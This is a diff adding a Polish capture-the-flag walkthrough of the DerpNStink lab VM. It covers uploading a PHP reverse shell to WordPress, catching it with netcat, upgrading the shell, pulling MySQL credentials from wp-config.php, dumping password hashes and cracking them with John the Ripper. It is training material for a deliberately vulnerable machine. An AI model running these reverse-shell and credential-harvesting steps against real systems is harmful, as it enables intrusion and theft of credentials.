@@ -245,11 +245,309 @@ Pozostaje nam wykorzystać tę informację i spróbować się zalogować
 Zobaczmy czy zadziała z tym hasłem
 `login:admin password:admin`
 
-Próba zakończona powodzeniem. W rezultacie trafiamy do panelu wordpressa jako użytkownik z ograniczonymi uprawnieniami.
+Tym razem się udało. W rezultacie trafiamy do panelu wordpressa jako użytkownik z ograniczonymi uprawnieniami. 
 ![](https://github.com/d15rup7or/Labs/blob/master/DerpNStink/img/slideshow.png)
 
+## 2. Reverse shell
+
+Kolejnym krokiem będzie uploadowanie [PHP Reverse Shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) (Kali Linux ma go w katalogu `usr/share/webshells/php`) (wcześniej zmieniamy w nim parametry $ip na adres maszyny wirtualnej oraz $port) 
+![](https://github.com/d15rup7or/Labs/blob/master/DerpNStink/img/shell-upload.png)
+
+Odpalamy netcat i ustawiamy go tak żeby nasłuchiwał na uprzednio wybranym porcie. Dla nas będzie to port **4443**: <br>
+`nc -nlvp 4443`
+
+```
+listening on [any] 4443 ...
+connect to [192.168.56.1] from (UNKNOWN) [192.168.56.101] 35050
+Linux DeRPnStiNK 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux
+ 08:07:59 up  1:15,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$
+```
+Sprawdźmy czy możemy użyć Pythona dla upgradu shella
+```
+$ which python
+/usr/bin/python
+```
+Upgradujmy shella do interaktywnego TTY <br>
+
+`python -c 'import pty;pty.spawn("/bin/bash")'`
+
+I voilà! Mamy pełnowymiarową powłokę"
+
+```
+$ python -c 'import pty;pty.spawn("/bin/bash")'
+www-data@DeRPnStiNK:/$   
+```
+Wejdźmy do katalogu `/var/www/html` i zobaczmy co na nas czeka
+```
+www-data@DeRPnStiNK:/$ cd /var/www/html
+cd /var/www/html
+www-data@DeRPnStiNK:/var/www/html$ 
+```
+
+Wylistujmy zawartość
+`ls -l`
+```
+drwxr-xr-x 2 root     root   4096 Nov 11  2017 css
+-rw-r--r-- 1 root     root 108987 Nov 11  2017 derp.png
+-rw-r--r-- 1 root     root   1298 Nov 12  2017 index.html
+drwxr-xr-x 2 root     root   4096 Nov 11  2017 js
+drwxr-xr-x 2 root     root   4096 Nov 11  2017 php
+-rw-r--r-- 1 root     root     53 Nov 11  2017 robots.txt
+-rw-r--r-- 1 root     root 222045 Nov 11  2017 stinky.png
+drwxrwxrwx 2 root     root   4096 Nov 12  2017 temporary
+drwxr-xr-x 5 www-data root   4096 Dec 12  2017 weblog
+drwxr-xr-x 2 root     root   4096 Jan  9  2018 webnotes
+```
+
+Zobaczmy co dalej `cd weblog` -> `ls`
+```
+www-data@DeRPnStiNK:/var/www/html$ cd weblog
+cd weblog
+www-data@DeRPnStiNK:/var/www/html/weblog$ ls
+ls
+index.php        wp-blog-header.php    wp-cron.php        wp-mail.php
+license.txt      wp-comments-post.php  wp-includes        wp-settings.php
+readme.html      wp-config-sample.php  wp-links-opml.php  wp-signup.php
+wp-activate.php  wp-config.php         wp-load.php        wp-trackback.php
+wp-admin         wp-content            wp-login.php       xmlrpc.php
+www-data@DeRPnStiNK:/var/www/html/weblog$ 
+```
+Ciekawość nakazuje zajrzeć do pliku _wp-config.php_ (zazwyczaj zawiera dane dot. konfiguracji MySQL takie jak prefixy, klucze i dane dostępowe)
+`less wp-config.php`
+
+```
+:
+/** MySQL database username */
+:
+define('DB_USER', 'root');
+:
+
+:
+/** MySQL database password */
+:
+define('DB_PASSWORD', 'mysql');
+:
+
+:
+/** MySQL hostname */
+:
+define('DB_HOST', 'localhost');
+:
+```
+
+Jak widzimy możemy zalogować się do MySQL za pomocą danych `root:mysql`
+
+##3. Enumeracja bazdy danych MySQL
+
+`mysql -u root -pmysql`
+
+```
+www-data@DeRPnStiNK:/var/www/html/weblog$ mysql -u root -pmysql
+mysql -u root -pmysql
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 148
+Server version: 5.5.58-0ubuntu0.14.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> 
+```
+Zobaczmy jak duży mamy wybór i ustalmy co może nam się przydać. Rozejrzyjmy się od razu za danymi dostępowymi.
+
+`show databases;`
+
+```
+mysql> show databases
+show databases
+    -> ;
+;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| phpmyadmin         |
+| wordpress          |
++--------------------+
+5 rows in set (0.00 sec)
+
+mysql> use wordpress;
+use wordpress;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
+show tables;
++----------------------------+
+| Tables_in_wordpress        |
++----------------------------+
+| wp_commentmeta             |
+| wp_comments                |
+| wp_gallery_galleries       |
+| wp_gallery_galleriesslides |
+| wp_gallery_slides          |
+| wp_links                   |
+| wp_options                 |
+| wp_postmeta                |
+| wp_posts                   |
+| wp_term_relationships      |
+| wp_term_taxonomy           |
+| wp_termmeta                |
+| wp_terms                   |
+| wp_usermeta                |
+| wp_users                   |
++----------------------------+
+15 rows in set (0.01 sec)
+```
+Wyświetlamy informacje o kolumnach w tabeli `wp_users`:<br>
+`show columns from wp_users;`
+
+```
+mysql> show columns from wp_users;
+show columns from wp_users;
++---------------------+---------------------+------+-----+---------------------+----------------+
+| Field               | Type                | Null | Key | Default             | Extra          |
++---------------------+---------------------+------+-----+---------------------+----------------+
+| ID                  | bigint(20) unsigned | NO   | PRI | NULL                | auto_increment |
+| user_login          | varchar(60)         | NO   | MUL |                     |                |
+| user_pass           | varchar(255)        | NO   |     |                     |                |
+| user_nicename       | varchar(50)         | NO   | MUL |                     |                |
+| user_email          | varchar(100)        | NO   | MUL |                     |                |
+| user_url            | varchar(100)        | NO   |     |                     |                |
+| user_registered     | datetime            | NO   |     | 0000-00-00 00:00:00 |                |
+| user_activation_key | varchar(255)        | NO   |     |                     |                |
+| user_status         | int(11)             | NO   |     | 0                   |                |
+| display_name        | varchar(250)        | NO   |     |                     |                |
+| flag2               | text                | NO   |     | NULL                |                |
++---------------------+---------------------+------+-----+---------------------+----------------+
+11 rows in set (0.01 sec)
+```
+
+Wygląda na to, że mamy kolejną flagę.
+```
+mysql> select flag2 from wp_users;
+select flag2 from wp_users;
++-------+
+| flag2 |
++-------+
+|       |
+|       |
++-------+
+2 rows in set (0.00 sec)
+```
+
+Niestety nie tym razem. W zamian poszukajmy loginów i haseł istniejących użytkowników:
+`select user_login, user_pass from wp_users;`
+
+W efekcie dostajemy:
+
+```
+mysql> select user_login, user_pass from wp_users;
+select user_login, user_pass from wp_users;
++-------------+------------------------------------+
+| user_login  | user_pass                          |
++-------------+------------------------------------+
+| unclestinky | $P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41 |
+| admin       | $P$BgnU3VLAv.RWd3rdrkfVIuQr6mFvpd/ |
++-------------+------------------------------------+
+2 rows in set (0.01 sec)
+```
+Warto przypomnieć, że znamy już hasło użytkownika _admin_, teraz przyda nam się komplet danych dla _unclestinky_
+
+Przyjrzyjmy się jeszcze bazie mysql
+```
+mysql> show databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| phpmyadmin         |
+| wordpress          |
++--------------------+
+5 rows in set (0.00 sec)
+
+mysql> use mysql
+use mysql
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
+show tables;
++---------------------------+
+| Tables_in_mysql           |
++---------------------------+
+| columns_priv              |
+| db                        |
+| event                     |
+| func                      |
+| general_log               |
+| help_category             |
+| help_keyword              |
+| help_relation             |
+| help_topic                |
+| host                      |
+| ndb_binlog_index          |
+| plugin                    |
+| proc                      |
+| procs_priv                |
+| proxies_priv              |
+| servers                   |
+| slow_log                  |
+| tables_priv               |
+| time_zone                 |
+| time_zone_leap_second     |
+| time_zone_name            |
+| time_zone_transition      |
+| time_zone_transition_type |
+| user                      |
++---------------------------+
+24 rows in set (0.00 sec)
+```
+Wyświetlmy listę kolumn i zobaczmy dostępnych Użytkowników i Hasła:
+`show columns from user;`->`select User,Password from user;
+
+```
+mysql> select User,Password from user;
+select User,Password from user;
++------------------+-------------------------------------------+
+| User             | Password                                  |
++------------------+-------------------------------------------+
+| root             | *E74858DB86EBA20BC33D0AECAE8A8108C56B17FA |
+| root             | *E74858DB86EBA20BC33D0AECAE8A8108C56B17FA |
+| root             | *E74858DB86EBA20BC33D0AECAE8A8108C56B17FA |
+| root             | *E74858DB86EBA20BC33D0AECAE8A8108C56B17FA |
+| debian-sys-maint | *B95758C76129F85E0D68CF79F38B66F156804E93 |
+| unclestinky      | *9B776AFB479B31E8047026F1185E952DD1E530CB |
+| phpmyadmin       | *4ACFE3202A5FF5CF467898FC58AAB1D615029441 |
++------------------+-------------------------------------------+
+7 rows in set (0.01 sec)
+```
+
+Pozostaje nam zapisać dane do pliku _mysql_db.txt_ i doprowadzić tekst do formatu `user:hash`, tak aby przyjął go JohnTheRipper. \
+
+Dalej użyjemy listę _rockyou_, którą wykorzystamy jako słownik z potencjalnymi hasłami
+
+`john mysql_hash.txt --format=mysql-sha1 --wordlist=/usr/share/wordlists/rockyou.txt`
 
 
 
-## 2. 
+
+
+
 
